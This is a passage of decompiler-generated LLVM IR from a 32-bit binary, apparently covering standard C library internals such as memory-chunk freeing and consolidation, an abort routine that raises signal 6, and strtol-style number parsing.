  store i32 %v0_80539ac, i32* %v3_80539ac, align 4
  br label %dec_label_pc_8053acc

dec_label_pc_80539b4:                             ; preds = %dec_label_pc_805395c
  %v1_80539b4 = trunc i32 %v3_8053988 to i8
  %v2_80539b4 = and i8 %v1_80539b4, 2
  %v3_80539b4 = icmp eq i8 %v2_80539b4, 0
  %v5_80539b4 = zext i8 %v2_80539b4 to i32
  %v7_80539b4 = and i32 %v3_8053988, -256
  %v8_80539b4 = or i32 %v5_80539b4, %v7_80539b4
  store i32 %v8_80539b4, i32* @edx, align 4
  %v1_80539b7 = icmp eq i1 %v3_80539b4, false
  br i1 %v1_80539b7, label %dec_label_pc_8053aac, label %dec_label_pc_80539bd

dec_label_pc_80539bd:                             ; preds = %dec_label_pc_80539b4
  %v1_80539bd = or i32 %v1_8053980, 1
  %v3_80539bd = trunc i32 %v1_80539bd to i8
  store i32 %v1_80539bd, i32* %eax.global-to-local, align 4
  %v2_80539c0 = add i32 %v1_805398d, %v1_805397d
  store i32 %v2_80539c0, i32* @esi, align 4
  store i8 %v3_80539bd, i8* @global_var_8056bc0.206, align 64
  %v1_80539c8 = add i32 %v2_80539c0, 4
  %v2_80539c8 = inttoptr i32 %v1_80539c8 to i32*
  %v3_80539c8 = load i32, i32* %v2_80539c8, align 4
  store i32 %v3_80539c8, i32* %eax.global-to-local, align 4
  %v2_80539cf = inttoptr i32 %v1_8053988 to i8*
  %v3_80539cf = load i8, i8* %v2_80539cf, align 1
  %v4_80539cf = urem i8 %v3_80539cf, 2
  %v5_80539cf = icmp eq i8 %v4_80539cf, 0
  %v1_80539d3 = icmp eq i1 %v5_80539cf, false
  br i1 %v1_80539d3, label %dec_label_pc_80539f6, label %dec_label_pc_80539d5

dec_label_pc_80539d5:                             ; preds = %dec_label_pc_80539bd
  %v2_80539d5 = inttoptr i32 %v1_805397d to i32*
  %v3_80539d5 = load i32, i32* %v2_80539d5, align 4
  store i32 %v3_80539d5, i32* @ebp, align 4
  %v2_80539da = sub i32 %v1_805397d, %v3_80539d5
  store i32 %v2_80539da, i32* %eax.global-to-local, align 4
  %v1_80539dc = add i32 %v2_80539da, 8
  %v2_80539dc = inttoptr i32 %v1_80539dc to i32*
  %v3_80539dc = load i32, i32* %v2_80539dc, align 4
  store i32 %v3_80539dc, i32* @edi, align 4
  %v1_80539df = add i32 %v2_80539da, 12
  %v2_80539df = inttoptr i32 %v1_80539df to i32*
  %v3_80539df = load i32, i32* %v2_80539df, align 4
  store i32 %v3_80539df, i32* @edx, align 4
  %v1_80539e2 = add i32 %v3_80539dc, 12
  %v2_80539e2 = inttoptr i32 %v1_80539e2 to i32*
  %v3_80539e2 = load i32, i32* %v2_80539e2, align 4
  store i32 %v3_80539e2, i32* @ecx, align 4
  %v12_80539e5 = icmp eq i32 %v3_80539e2, %v2_80539da
  %v1_80539e7 = icmp eq i1 %v12_80539e5, false
  br i1 %v1_80539e7, label %dec_label_pc_8053a25, label %dec_label_pc_80539e9

dec_label_pc_80539e9:                             ; preds = %dec_label_pc_80539d5
  %v1_80539e9 = add i32 %v3_80539df, 8
  %v2_80539e9 = inttoptr i32 %v1_80539e9 to i32*
  %v3_80539e9 = load i32, i32* %v2_80539e9, align 4
  %v15_80539e9 = icmp eq i32 %v3_80539e9, %v3_80539e2
  %v1_80539ec = icmp eq i1 %v15_80539e9, false
  br i1 %v1_80539ec, label %dec_label_pc_8053a25, label %dec_label_pc_80539ee

dec_label_pc_80539ee:                             ; preds = %dec_label_pc_80539e9
  %v2_80539ee = add i32 %v3_80539d5, %v1_805398d
  store i32 %v2_80539ee, i32* @ebx, align 4
  store i32 %v3_80539df, i32* %v2_80539e2, align 4
  %v0_80539f3 = load i32, i32* @edi, align 4
  %v1_80539f3 = load i32, i32* @edx, align 4
  %v2_80539f3 = add i32 %v1_80539f3, 8
  %v3_80539f3 = inttoptr i32 %v2_80539f3 to i32*
  store i32 %v0_80539f3, i32* %v3_80539f3, align 4
  %v0_80539fd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80539f6

dec_label_pc_80539f6:                             ; preds = %dec_label_pc_80539bd, %dec_label_pc_80539ee
  %v1_8053a09 = phi i32 [ %v2_80539c0, %dec_label_pc_80539bd ], [ %v0_80539fd.pre, %dec_label_pc_80539ee ]
  %v1_80539fa = and i32 %v3_80539c8, -4
  store i32 %v1_80539fa, i32* @ebp, align 4
  %v1_80539fd = load i32, i32* @global_var_8056bec.207, align 4
  %v12_80539fd = icmp eq i32 %v1_8053a09, %v1_80539fd
  br i1 %v12_80539fd, label %dec_label_pc_8053a57, label %dec_label_pc_8053a05

dec_label_pc_8053a05:                             ; preds = %dec_label_pc_80539f6
  %v2_8053a05 = add i32 %v1_8053a09, 4
  %v3_8053a05 = add i32 %v2_8053a05, %v1_80539fa
  %v4_8053a05 = inttoptr i32 %v3_8053a05 to i32*
  %v5_8053a05 = load i32, i32* %v4_8053a05, align 4
  store i32 %v5_8053a05, i32* %eax.global-to-local, align 4
  %v3_8053a09 = inttoptr i32 %v2_8053a05 to i32*
  store i32 %v1_80539fa, i32* %v3_8053a09, align 4
  %v0_8053a0c = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a0c = urem i32 %v0_8053a0c, 2
  %v2_8053a0c = icmp eq i32 %v1_8053a0c, 0
  store i32 %v1_8053a0c, i32* %eax.global-to-local, align 4
  %v1_8053a11 = icmp eq i1 %v2_8053a0c, false
  br i1 %v1_8053a11, label %dec_label_pc_8053a32, label %dec_label_pc_8053a13

dec_label_pc_8053a13:                             ; preds = %dec_label_pc_8053a05
  %v0_8053a13 = load i32, i32* @esi, align 4
  %v1_8053a13 = add i32 %v0_8053a13, 8
  %v2_8053a13 = inttoptr i32 %v1_8053a13 to i32*
  %v3_8053a13 = load i32, i32* %v2_8053a13, align 4
  store i32 %v3_8053a13, i32* @edx, align 4
  %v1_8053a16 = add i32 %v0_8053a13, 12
  %v2_8053a16 = inttoptr i32 %v1_8053a16 to i32*
  %v3_8053a16 = load i32, i32* %v2_8053a16, align 4
  store i32 %v3_8053a16, i32* %eax.global-to-local, align 4
  %v1_8053a19 = add i32 %v3_8053a13, 12
  %v2_8053a19 = inttoptr i32 %v1_8053a19 to i32*
  %v3_8053a19 = load i32, i32* %v2_8053a19, align 4
  store i32 %v3_8053a19, i32* @edi, align 4
  %v12_8053a1c = icmp eq i32 %v3_8053a19, %v0_8053a13
  %v1_8053a1e = icmp eq i1 %v12_8053a1c, false
  br i1 %v1_8053a1e, label %dec_label_pc_8053a25, label %dec_label_pc_8053a20

dec_label_pc_8053a20:                             ; preds = %dec_label_pc_8053a13
  %v1_8053a20 = add i32 %v3_8053a16, 8
  %v2_8053a20 = inttoptr i32 %v1_8053a20 to i32*
  %v3_8053a20 = load i32, i32* %v2_8053a20, align 4
  %v15_8053a20 = icmp eq i32 %v3_8053a20, %v3_8053a19
  br i1 %v15_8053a20, label %dec_label_pc_8053a2a, label %dec_label_pc_8053a25

dec_label_pc_8053a25:                             ; preds = %dec_label_pc_8053a20, %dec_label_pc_8053a13, %dec_label_pc_80539e9, %dec_label_pc_80539d5
  %v0_8053a25 = call i32 @function_8053ae5()
  store i32 %v0_8053a25, i32* %eax.global-to-local, align 4
  %v1_8053a2a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053a2a

dec_label_pc_8053a2a:                             ; preds = %dec_label_pc_8053a20, %dec_label_pc_8053a25
  %v1_8053a2a = phi i32 [ %v3_8053a13, %dec_label_pc_8053a20 ], [ %v1_8053a2a.pre, %dec_label_pc_8053a25 ]
  %v0_8053a2a = phi i32 [ %v3_8053a16, %dec_label_pc_8053a20 ], [ %v0_8053a25, %dec_label_pc_8053a25 ]
  %v2_8053a2a = add i32 %v1_8053a2a, 12
  %v3_8053a2a = inttoptr i32 %v2_8053a2a to i32*
  store i32 %v0_8053a2a, i32* %v3_8053a2a, align 4
  %v0_8053a2d = load i32, i32* @edx, align 4
  %v1_8053a2d = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a2d = add i32 %v1_8053a2d, 8
  %v3_8053a2d = inttoptr i32 %v2_8053a2d to i32*
  store i32 %v0_8053a2d, i32* %v3_8053a2d, align 4
  %v0_8053a30 = load i32, i32* @ebx, align 4
  %v1_8053a30 = load i32, i32* @ebp, align 4
  %v2_8053a30 = add i32 %v1_8053a30, %v0_8053a30
  store i32 %v2_8053a30, i32* @ebx, align 4
  br label %dec_label_pc_8053a32

dec_label_pc_8053a32:                             ; preds = %dec_label_pc_8053a05, %dec_label_pc_8053a2a
  %v0_8053a32 = load i32, i32* @global_var_8056bfc.225, align 4
  store i32 %v0_8053a32, i32* %eax.global-to-local, align 4
  %v0_8053a37 = load i32, i32* @ecx, align 4
  %v1_8053a37 = add i32 %v0_8053a37, 12
  %v2_8053a37 = inttoptr i32 %v1_8053a37 to i32*
  store i32 ptrtoint (i32* @global_var_8056bf4.209 to i32), i32* %v2_8053a37, align 4
  %v0_8053a3e = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a3e = load i32, i32* @ecx, align 4
  %v2_8053a3e = add i32 %v1_8053a3e, 8
  %v3_8053a3e = inttoptr i32 %v2_8053a3e to i32*
  store i32 %v0_8053a3e, i32* %v3_8053a3e, align 4
  %v0_8053a41 = load i32, i32* @ebx, align 4
  %v1_8053a41 = load i32, i32* @ecx, align 4
  %v3_8053a41 = add i32 %v1_8053a41, %v0_8053a41
  %v4_8053a41 = inttoptr i32 %v3_8053a41 to i32*
  store i32 %v0_8053a41, i32* %v4_8053a41, align 4
  %v0_8053a44 = load i32, i32* @ecx, align 4
  %v1_8053a44 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a44 = add i32 %v1_8053a44, 12
  %v3_8053a44 = inttoptr i32 %v2_8053a44 to i32*
  store i32 %v0_8053a44, i32* %v3_8053a44, align 4
  %v0_8053a47 = load i32, i32* @ebx, align 4
  %v1_8053a49 = or i32 %v0_8053a47, 1
  store i32 %v1_8053a49, i32* %eax.global-to-local, align 4
  %v0_8053a4c = load i32, i32* @ecx, align 4
  store i32 %v0_8053a4c, i32* @global_var_8056bfc.225, align 4
  %v2_8053a52 = add i32 %v0_8053a4c, 4
  %v3_8053a52 = inttoptr i32 %v2_8053a52 to i32*
  store i32 %v1_8053a49, i32* %v3_8053a52, align 4
  br label %dec_label_pc_8053a67

dec_label_pc_8053a57:                             ; preds = %dec_label_pc_80539f6
  %v0_8053a57 = load i32, i32* @ebx, align 4
  %v2_8053a57 = add i32 %v0_8053a57, %v1_80539fa
  store i32 %v2_8053a57, i32* @ebx, align 4
  %v1_8053a5b = or i32 %v2_8053a57, 1
  store i32 %v1_8053a5b, i32* %eax.global-to-local, align 4
  %v1_8053a5e = load i32, i32* @ecx, align 4
  %v2_8053a5e = add i32 %v1_8053a5e, 4
  %v3_8053a5e = inttoptr i32 %v2_8053a5e to i32*
  store i32 %v1_8053a5b, i32* %v3_8053a5e, align 4
  %v0_8053a61 = load i32, i32* @ecx, align 4
  store i32 %v0_8053a61, i32* @global_var_8056bec.207, align 4
  br label %dec_label_pc_8053a67

dec_label_pc_8053a67:                             ; preds = %dec_label_pc_8053a32, %dec_label_pc_8053a57
  %v0_8053a67 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8053a67, 131072
  br i1 %tmp21, label %dec_label_pc_8053acc, label %dec_label_pc_8053a6f

dec_label_pc_8053a6f:                             ; preds = %dec_label_pc_8053a67
  %v0_8053a6f = load i8, i8* @global_var_8056bc0.206, align 64
  %v1_8053a6f = and i8 %v0_8053a6f, 2
  %v2_8053a6f = icmp eq i8 %v1_8053a6f, 0
  br i1 %v2_8053a6f, label %dec_label_pc_8053a88, label %dec_label_pc_8053a78

dec_label_pc_8053a78:                             ; preds = %dec_label_pc_8053a6f
  %v2_8053a80 = call i32 @function_80537a1(i32* bitcast (i8* @global_var_8056bc0.206 to i32*))
  store i32 %v2_8053a80, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a88

dec_label_pc_8053a88:                             ; preds = %dec_label_pc_8053a6f, %dec_label_pc_8053a78
  %v0_8053a88 = load i32, i32* @global_var_8056bec.207, align 4
  store i32 %v0_8053a88, i32* %eax.global-to-local, align 4
  %v1_8053a8d = add i32 %v0_8053a88, 4
  %v2_8053a8d = inttoptr i32 %v1_8053a8d to i32*
  %v3_8053a8d = load i32, i32* %v2_8053a8d, align 4
  %v1_8053a90 = and i32 %v3_8053a8d, -4
  store i32 %v1_8053a90, i32* %eax.global-to-local, align 4
  %v1_8053a93 = load i32, i32* @global_var_8056f04.223, align 4
  %v7_8053a93 = icmp ult i32 %v1_8053a90, %v1_8053a93
  br i1 %v7_8053a93, label %dec_label_pc_8053acc, label %dec_label_pc_8053a9b

dec_label_pc_8053a9b:                             ; preds = %dec_label_pc_8053a88
  store i32 ptrtoint (i8* @global_var_8056bc0.206 to i32), i32* @edx, align 4
  %v0_8053aa0 = load i32, i32* @global_var_8056f08.221, align 8
  store i32 %v0_8053aa0, i32* @eax, align 4
  %v0_8053aa5 = call i32 @function_8053714()
  store i32 %v0_8053aa5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053acc

dec_label_pc_8053aac:                             ; preds = %dec_label_pc_80539b4
  %v2_8053aac = inttoptr i32 %v1_805397d to i32*
  %v3_8053aac = load i32, i32* %v2_8053aac, align 4
  %v0_8053aaf = load i32, i32* @global_var_8056f10.214, align 16
  %v1_8053aaf = add i32 %v0_8053aaf, -1
  store i32 %v1_8053aaf, i32* @global_var_8056f10.214, align 16
  %v2_8053ab5 = add i32 %v3_8053aac, %v1_805398d
  store i32 %v2_8053ab5, i32* %eax.global-to-local, align 4
  %v2_8053ab8 = sub i32 %v1_805397d, %v3_8053aac
  %v0_8053abe = load i32, i32* @global_var_8056f24.217, align 4
  %v2_8053abe = sub i32 %v0_8053abe, %v2_8053ab5
  store i32 %v2_8053abe, i32* @global_var_8056f24.217, align 4
  %v4_8053ac4 = inttoptr i32 %v2_8053ab8 to i32*
  %v5_8053ac4 = call i32 @function_8054815(i32* %v4_8053ac4, i32 %v2_8053ab5, i32 %v1_805398d, i32 %v1_805398d)
  store i32 %v5_8053ac4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053acc

dec_label_pc_8053acc:                             ; preds = %dec_label_pc_8053a88, %dec_label_pc_8053a67, %dec_label_pc_8053a9b, %dec_label_pc_8053994, %dec_label_pc_8053aac
  store i32 %v2_8053967, i32* @eax, align 4
  %v2_8053ad5 = call i32 @function_80540b0(i32 %v2_8053967, i32 1)
  store i32 %v2_8053ad5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053add

dec_label_pc_8053add:                             ; preds = %dec_label_pc_8053949, %dec_label_pc_8053acc
  %.0 = phi i32 [ undef, %dec_label_pc_8053949 ], [ %v2_8053ad5, %dec_label_pc_8053acc ]
  store i32 %v0_805394c, i32* @ebx, align 4
  store i32 %v0_805394b, i32* @esi, align 4
  store i32 %v0_805394a, i32* @edi, align 4
  store i32 %v0_8053949, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8053aac, { 1, 0 }
  uselistorder i32 %v0_8053a41, { 1, 0 }
  uselistorder i32 %v1_8053a0c, { 1, 0 }
  uselistorder i32 %v2_8053a05, { 1, 0 }
  uselistorder i32 %v1_80539fa, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053a09, { 1, 0 }
  uselistorder i32 %v1_805398d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8053988, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805397d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8056bc0.206 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8056bf4.209 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8056bec.207, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8056bc0.206 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8056bc0.206, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8056820.205 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8053add, { 1, 0 }
  uselistorder label %dec_label_pc_8053acc, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053a88, { 1, 0 }
  uselistorder label %dec_label_pc_8053a67, { 1, 0 }
  uselistorder label %dec_label_pc_8053a32, { 1, 0 }
  uselistorder label %dec_label_pc_8053a2a, { 1, 0 }
  uselistorder label %dec_label_pc_80539f6, { 1, 0 }
}

define i32 @function_8053ae5() local_unnamed_addr {
dec_label_pc_8053b00.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8053af1 = call i32 @function_80540ad(i32 ptrtoint (i32* @global_var_8056838.226 to i32))
  %v12_8053afb = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053b0048 = add i32 %v12_8053afb, 276
  %v5_8053b0049 = inttoptr i32 %v4_8053b0048 to i32*
  store i32 0, i32* %v5_8053b0049, align 4
  %v0_8053b0b50 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b0b51 = add i32 %v0_8053b0b50, -1
  %v9_8053b0b52 = icmp slt i32 %v1_8053b0b51, 0
  store i32 %v1_8053b0b51, i32* %eax.global-to-local, align 4
  %v1_8053b0c53 = icmp eq i1 %v9_8053b0b52, false
  br i1 %v1_8053b0c53, label %dec_label_pc_8053b00.dec_label_pc_8053b00_crit_edge, label %dec_label_pc_8053b0e

dec_label_pc_8053b00.dec_label_pc_8053b00_crit_edge: ; preds = %dec_label_pc_8053b00.lr.ph, %dec_label_pc_8053b00.dec_label_pc_8053b00_crit_edge
  %v1_8053b0b54 = phi i32 [ %v1_8053b0b, %dec_label_pc_8053b00.dec_label_pc_8053b00_crit_edge ], [ %v1_8053b0b51, %dec_label_pc_8053b00.lr.ph ]
  %v0_8053b00.pre = load i32, i32* @esp, align 4
  %v2_8053b00 = mul i32 %v1_8053b0b54, 4
  %v3_8053b00 = add i32 %v0_8053b00.pre, 152
  %v4_8053b00 = add i32 %v3_8053b00, %v2_8053b00
  %v5_8053b00 = inttoptr i32 %v4_8053b00 to i32*
  store i32 0, i32* %v5_8053b00, align 4
  %v0_8053b0b = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b0b = add i32 %v0_8053b0b, -1
  %v9_8053b0b = icmp slt i32 %v1_8053b0b, 0
  store i32 %v1_8053b0b, i32* %eax.global-to-local, align 4
  %v1_8053b0c = icmp eq i1 %v9_8053b0b, false
  br i1 %v1_8053b0c, label %dec_label_pc_8053b00.dec_label_pc_8053b00_crit_edge, label %dec_label_pc_8053b0e

dec_label_pc_8053b0e:                             ; preds = %dec_label_pc_8053b00.dec_label_pc_8053b00_crit_edge, %dec_label_pc_8053b00.lr.ph
  %v0_8053b0e = load i32, i32* @ebx, align 4
  %v2_8053b12 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8053b12, i32* @ebx, align 4
  %v4_8053b1a = call i32 @function_8052b3e(i32 %v2_8053b12, i32 6, i32 %v0_8053b0e, i32 %v0_8053b0e)
  store i32 %v4_8053b1a, i32* %eax.global-to-local, align 4
  %v1_8053b22 = icmp eq i32 %v4_8053b1a, 0
  %v1_8053b24 = icmp eq i1 %v1_8053b22, false
  br i1 %v1_8053b24, label %dec_label_pc_8053b34, label %dec_label_pc_8053b26

dec_label_pc_8053b26:                             ; preds = %dec_label_pc_8053b0e
  %v3_8053b2c = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8053b2c = call i32 @function_805245d(i32 1, %_TYPEDEF_sigset_t* %v3_8053b2c, i32 0)
  store i32 %v4_8053b2c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b34

dec_label_pc_8053b34:                             ; preds = %dec_label_pc_8053b0e, %dec_label_pc_8053b26
  %v2_8053b6c23 = phi i32 [ %v4_8053b1a, %dec_label_pc_8053b0e ], [ %v4_8053b2c, %dec_label_pc_8053b26 ]
  %v0_8053b34 = load i8, i8* @global_var_8056934.227, align 4
  %v1_8053b34 = icmp eq i8 %v0_8053b34, 0
  %v1_8053b3b = icmp eq i1 %v1_8053b34, false
  br i1 %v1_8053b3b, label %dec_label_pc_8053b6c, label %dec_label_pc_8053b3d

dec_label_pc_8053b3d:                             ; preds = %dec_label_pc_8053b34
  store i8 1, i8* @global_var_8056934.227, align 4
  br label %dec_label_pc_8053b44

dec_label_pc_8053b44:                             ; preds = %dec_label_pc_8053bab, %dec_label_pc_8053b3d
  %v1_8053b4c = call i32 @function_80540ad(i32 ptrtoint (i32* @global_var_8056838.226 to i32))
  store i32 %v1_8053b4c, i32* %eax.global-to-local, align 4
  %v1_8053b58 = call i32 @function_8052a10(i32 6)
  store i32 %v1_8053b58, i32* %eax.global-to-local, align 4
  %v1_8053b64 = call i32 @function_80540ad(i32 ptrtoint (i32* @global_var_8056838.226 to i32))
  store i32 %v1_8053b64, i32* %eax.global-to-local, align 4
  %v0_8053b6c.pre = load i8, i8* @global_var_8056934.227, align 4
  br label %dec_label_pc_8053b6c

dec_label_pc_8053b6c:                             ; preds = %dec_label_pc_8053b34, %dec_label_pc_8053b44
  %v2_8053b6c = phi i32 [ %v2_8053b6c23, %dec_label_pc_8053b34 ], [ %v1_8053b64, %dec_label_pc_8053b44 ]
  %v0_8053b6c = phi i8 [ %v0_8053b34, %dec_label_pc_8053b34 ], [ %v0_8053b6c.pre, %dec_label_pc_8053b44 ]
  %v1_8053b6c = zext i8 %v0_8053b6c to i32
  %v3_8053b6c = and i32 %v2_8053b6c, -256
  %v4_8053b6c = or i32 %v1_8053b6c, %v3_8053b6c
  store i32 %v4_8053b6c, i32* %eax.global-to-local, align 4
  %v10_8053b71 = icmp eq i8 %v0_8053b6c, 1
  %v1_8053b73 = icmp eq i1 %v10_8053b71, false
  br i1 %v1_8053b73, label %dec_label_pc_8053bcd, label %dec_label_pc_8053ba0.lr.ph

dec_label_pc_8053ba0.lr.ph:                       ; preds = %dec_label_pc_8053b6c
  store i8 2, i8* @global_var_8056934.227, align 4
  %v2_8053b84 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8053b84, i32* %eax.global-to-local, align 4
  %v3_8053b89 = bitcast i32* %stack_var_-272 to i8*
  %v4_8053b89 = call i32 @function_805277a(i8* %v3_8053b89, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053ba040 = add i32 %v12_8053afb, 140
  %v5_8053ba041 = inttoptr i32 %v4_8053ba040 to i32*
  store i32 -1, i32* %v5_8053ba041, align 4
  %v0_8053ba842 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ba843 = add i32 %v0_8053ba842, -1
  %v9_8053ba844 = icmp slt i32 %v1_8053ba843, 0
  store i32 %v1_8053ba843, i32* %eax.global-to-local, align 4
  %v1_8053ba945 = icmp eq i1 %v9_8053ba844, false
  br i1 %v1_8053ba945, label %dec_label_pc_8053ba0.dec_label_pc_8053ba0_crit_edge, label %dec_label_pc_8053bab

dec_label_pc_8053ba0.dec_label_pc_8053ba0_crit_edge: ; preds = %dec_label_pc_8053ba0.lr.ph, %dec_label_pc_8053ba0.dec_label_pc_8053ba0_crit_edge
  %v1_8053ba846 = phi i32 [ %v1_8053ba8, %dec_label_pc_8053ba0.dec_label_pc_8053ba0_crit_edge ], [ %v1_8053ba843, %dec_label_pc_8053ba0.lr.ph ]
  %v0_8053ba0.pre = load i32, i32* @esp, align 4
  %v2_8053ba0 = mul i32 %v1_8053ba846, 4
  %v3_8053ba0 = add i32 %v0_8053ba0.pre, 16
  %v4_8053ba0 = add i32 %v3_8053ba0, %v2_8053ba0
  %v5_8053ba0 = inttoptr i32 %v4_8053ba0 to i32*
  store i32 -1, i32* %v5_8053ba0, align 4
  %v0_8053ba8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ba8 = add i32 %v0_8053ba8, -1
  %v9_8053ba8 = icmp slt i32 %v1_8053ba8, 0
  store i32 %v1_8053ba8, i32* %eax.global-to-local, align 4
  %v1_8053ba9 = icmp eq i1 %v9_8053ba8, false
  br i1 %v1_8053ba9, label %dec_label_pc_8053ba0.dec_label_pc_8053ba0_crit_edge, label %dec_label_pc_8053bab

dec_label_pc_8053bab:                             ; preds = %dec_label_pc_8053ba0.dec_label_pc_8053ba0_crit_edge, %dec_label_pc_8053ba0.lr.ph
  store i32 %v2_8053b84, i32* %eax.global-to-local, align 4
  %v4_8053bc0 = call i32 @function_80542ef(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8053bc0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b44

dec_label_pc_8053bcd:                             ; preds = %dec_label_pc_8053b6c
  %v10_8053bcd = icmp eq i8 %v0_8053b6c, 2
  %v1_8053bcf = icmp eq i1 %v10_8053bcd, false
  br i1 %v1_8053bcf, label %dec_label_pc_8053bd9, label %dec_label_pc_8053bd9.thread

dec_label_pc_8053bd9.thread:                      ; preds = %dec_label_pc_8053bcd
  store i8 3, i8* @global_var_8056934.227, align 4
  br label %dec_label_pc_8053be2

dec_label_pc_8053bd9:                             ; preds = %dec_label_pc_8053bcd
  %v9_8053bd9 = icmp eq i8 %v0_8053b6c, 3
  %v1_8053be0 = icmp eq i1 %v9_8053bd9, false
  br i1 %v1_8053be0, label %dec_label_pc_8053bf3, label %dec_label_pc_8053be2

dec_label_pc_8053be2:                             ; preds = %dec_label_pc_8053bd9.thread, %dec_label_pc_8053bd9
  store i8 4, i8* @global_var_8056934.227, align 4
  %v1_8053bee = call i32 @function_8054450(i32 127)
  unreachable

dec_label_pc_8053bf3:                             ; preds = %dec_label_pc_8053bd9, %dec_label_pc_8053bf3
  br label %dec_label_pc_8053bf3

; uselistorder directives
  uselistorder i32 %v1_8053ba8, { 2, 1, 0 }
  uselistorder i32 %v1_8053b0b, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 15, 16, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 17, 18, 13, 14 }
  uselistorder i8 3, { 0, 4, 1, 2, 3 }
  uselistorder i8 2, { 8, 11, 12, 1, 13, 2, 3, 4, 5, 6, 14, 15, 7, 0, 10, 16, 9 }
  uselistorder i8* @global_var_8056934.227, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8053bf3, { 1, 0 }
  uselistorder label %dec_label_pc_8053be2, { 1, 0 }
  uselistorder label %dec_label_pc_8053ba0.dec_label_pc_8053ba0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8053b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8053b34, { 1, 0 }
  uselistorder label %dec_label_pc_8053b00.dec_label_pc_8053b00_crit_edge, { 1, 0 }
}

define i32 @function_8053bf6() local_unnamed_addr {
dec_label_pc_8053bf6:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v3_8053c01 = call i32 @function_8053c0a(i32 %tmp, i32 0, i32 10)
  ret i32 %v3_8053c01
}

define i32 @function_8053c0a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053c0a:
  %v4_8053c1b = inttoptr i32 %arg1 to i8*
  %v5_8053c1b = call i32 @function_8053c24(i8* %v4_8053c1b, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8053c1b
}

define i32 @function_8053c24(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053c24:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_8053c27 = load i32, i32* @ebx, align 4
  store i32 %v0_8053c27, i32* %stack_var_-16, align 4
  %v0_8053c2b = load i32, i32* bitcast (i32** @global_var_805686c.229 to i32*), align 4
  store i32 %v0_8053c2b, i32* %edx.global-to-local, align 4
  %v4_8053c31 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8053c31, i32* %ebx.global-to-local, align 4
  %v2_8053c3e8 = load i8, i8* %arg1, align 1
  %v3_8053c3e9 = sext i8 %v2_8053c3e8 to i32
  store i32 %v3_8053c3e9, i32* %eax.global-to-local, align 4
  %v2_8053c4111 = mul nsw i32 %v3_8053c3e9, 2
  %v3_8053c4112 = add i32 %v2_8053c4111, %v0_8053c2b
  %v4_8053c4113 = inttoptr i32 %v3_8053c4112 to i8*
  %v5_8053c4114 = load i8, i8* %v4_8053c4113, align 1
  %v6_8053c4115 = and i8 %v5_8053c4114, 32
  %v7_8053c4116 = icmp eq i8 %v6_8053c4115, 0
  %v1_8053c4517 = icmp eq i1 %v7_8053c4116, false
